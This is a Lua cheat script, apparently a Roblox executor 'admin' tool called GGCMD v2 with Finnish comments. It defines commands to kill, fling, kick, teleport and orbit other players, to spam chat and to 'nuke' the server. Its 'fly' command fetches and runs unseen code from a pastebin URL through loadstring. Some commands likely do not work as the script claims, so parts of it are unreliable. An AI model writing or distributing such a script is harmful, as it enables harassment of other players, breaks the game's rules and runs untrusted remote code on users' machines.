--[[
  GGCMD v2 - Täysi versio, QuirckyCMD-tyylinen
  Tekijä: GGCMD-tiimi
  Discord: discord.gg/ggcmd
  Kaikki komennot käytettävissä ilman puolipistettä
]]

local players = game:GetService("Players")
local lp = players.LocalPlayer
local mouse = lp:GetMouse()
local uis = game:GetService("UserInputService")
local admins = {lp.Name}
local owners = {lp.Name}
local prefix = ""
local cmds = {}
local gui, input

-- Utility
local function isAdmin(name)
	for _, admin in pairs(admins) do
		if admin:lower() == name:lower() then return true end
	end
	for _, owner in pairs(owners) do
		if owner:lower() == name:lower() then return true end
	end
	return false
end

local function notify(text)
	game.StarterGui:SetCore("SendNotification", {
		Title = "GGCMD";
		Text = text;
		Duration = 5;
	})
end

-- GUI
local function createCmdBar()
	gui = Instance.new("ScreenGui", lp:WaitForChild("PlayerGui"))
	gui.Name = "GGCMD_GUI"

	local frame = Instance.new("Frame", gui)
	frame.Name = "CmdBar"
	frame.Size = UDim2.new(0.5, 0, 0, 40)
	frame.Position = UDim2.new(0.25, 0, 0.85, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.BackgroundTransparency = 0.2
	frame.Active = true
	frame.Draggable = true

	local textBox = Instance.new("TextBox", frame)
	textBox.Size = UDim2.new(1, 0, 1, 0)
	textBox.Text = ""
	textBox.PlaceholderText = "Kirjoita komento..."
	textBox.TextColor3 = Color3.fromRGB(255,255,255)
	textBox.BackgroundTransparency = 1
	textBox.ClearTextOnFocus = false
	textBox.TextScaled = true
	textBox.Font = Enum.Font.SourceSans
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	input = textBox

	textBox.FocusLost:Connect(function(enter)
		if enter and isAdmin(lp.Name) then
			local txt = textBox.Text
			textBox.Text = ""
			local args = txt:split(" ")
			local cmd = args[1]:lower()
			table.remove(args, 1)
			if cmds[cmd] then
				cmds[cmd](unpack(args))
			else
				notify("Tuntematon komento: "..cmd)
			end
		end
	end)
end

-- Komennot
cmds["fly"] = function()
	loadstring(game:HttpGet("https://pastebin.com/raw/sxg4k3D2"))()
end

cmds["unfly"] = function()
	if _G.Flying then _G.Flying = false end
end

cmds["flyspeed"] = function(s)
	_G.FLYSPEED = tonumber(s) or 2
end

cmds["kill"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character then
		target.Character:BreakJoints()
	end
end

cmds["tp"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character and lp.Character then
		lp.Character:PivotTo(target.Character:GetPivot())
	end
end

cmds["teleport"] = cmds["tp"]

cmds["kick"] = function(name)
	local target = players:FindFirstChild(name)
	if target then
		target:Destroy()
	end
end

cmds["fling"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character and lp.Character then
		local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
		local thrp = target.Character:FindFirstChild("HumanoidRootPart")
		if hrp and thrp then
			hrp.CFrame = thrp.CFrame
			wait(0.1)
			local v = Instance.new("BodyVelocity", hrp)
			v.Velocity = Vector3.new(9999,9999,9999)
			v.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
			game.Debris:AddItem(v, 0.1)
		end
	end
end

cmds["bring"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character and lp.Character then
		local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
		local thrp = target.Character:FindFirstChild("HumanoidRootPart")
		if hrp and thrp then
			thrp.CFrame = hrp.CFrame + Vector3.new(2,0,0)
		end
	end
end

cmds["spam"] = function(...)
	local text = table.concat({...}, " ")
	_G.Spamming = true
	task.spawn(function()
		while _G.Spamming do
			game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(text, "All")
			wait(0.5)
		end
	end)
end

cmds["unspam"] = function()
	_G.Spamming = false
end

cmds["orbit"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character then
		_G.Orbiting = true
		task.spawn(function()
			while _G.Orbiting do
				local angle = tick() * 5
				local pos = target.Character:GetPivot().Position
				local newPos = pos + Vector3.new(math.cos(angle)*5, 2, math.sin(angle)*5)
				if lp.Character and lp.Character:FindFirstChild("HumanoidRootPart") then
					lp.Character:PivotTo(CFrame.new(newPos, pos))
				end
				wait()
			end
		end)
	end
end

cmds["unorbit"] = function()
	_G.Orbiting = false
end

cmds["bang"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character and lp.Character then
		local tool = Instance.new("Tool")
		tool.RequiresHandle = false
		tool.Name = "Bang"
		tool.Parent = lp.Backpack
		local anim = Instance.new("Animation")
		anim.AnimationId = "rbxassetid://148840371"
		anim.Parent = tool
		tool.Activated:Connect(function()
			local h = lp.Character:FindFirstChildOfClass("Humanoid")
			if h then h:LoadAnimation(anim):Play() end
			wait()
			target.Character:BreakJoints()
		end)
	end
end

cmds["unbang"] = function()
	for _, tool in pairs(lp.Backpack:GetChildren()) do
		if tool.Name == "Bang" then
			tool:Destroy()
		end
	end
end

cmds["nuke"] = function()
	for _, p in pairs(players:GetPlayers()) do
		if p ~= lp then
			p:Kick("Nuked by "..lp.Name)
		end
	end
end

cmds["wither"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character then
		for _, part in pairs(target.Character:GetDescendants()) do
			if part:IsA("BasePart") then
				part.Anchored = false
				part.Velocity = Vector3.new(math.random(-100,100),math.random(100,200),math.random(-100,100))
			end
		end
	end
end

cmds["witherws"] = function(name)
	local target = players:FindFirstChild(name)
	if target and target.Character then
		target.Character:BreakJoints()
	end
end

-- Aloitus
createCmdBar()
notify("GGCMD v2 loaded succesfully!")
notify("thx for using GGCMD ")
